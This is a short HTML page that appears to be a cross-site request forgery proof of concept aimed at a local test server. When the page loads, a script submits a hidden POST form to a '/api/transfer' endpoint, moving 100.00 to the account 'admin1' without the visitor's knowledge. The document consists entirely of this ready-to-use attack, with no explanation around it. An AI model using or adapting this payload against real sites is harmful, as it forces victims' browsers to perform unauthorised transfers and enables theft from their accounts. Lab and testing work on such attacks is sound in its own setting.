<!DOCTYPE html>
<html>
<body>
    <!-- hidden iframe to prevent page navigation on submit -->
    <iframe name="hidden_frame" style="display:none"></iframe>

    <!-- HTML form that will automatically submit a hidden POST request -->
    <form action="http://localhost:80/api/transfer" method="POST">
        <input type="hidden" name="receiver" value="admin1">
        <input type="hidden" name="amount" value="100.00">
    </form>

    <script>
        // when the page loads, automatically submit the form
        window.onload = () => {
            document.forms[0].submit();
        };
    </script>
</body>
</html>
